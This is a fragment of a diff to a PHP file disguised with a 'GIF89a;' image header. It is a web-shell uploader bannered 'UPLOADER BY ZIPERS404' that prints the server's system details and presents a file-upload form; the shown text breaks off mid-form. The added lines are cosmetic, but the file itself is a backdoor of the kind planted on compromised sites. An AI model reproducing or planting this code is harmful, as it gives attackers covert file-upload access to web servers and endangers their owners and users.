@@ -1,6 +1,8 @@
 GIF89a;
 <?php
+echo "<br>";
 echo "UPLOADER BY ZIPERS404";
+echo "<br>";
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
       <input type='file' name='idx_file'>
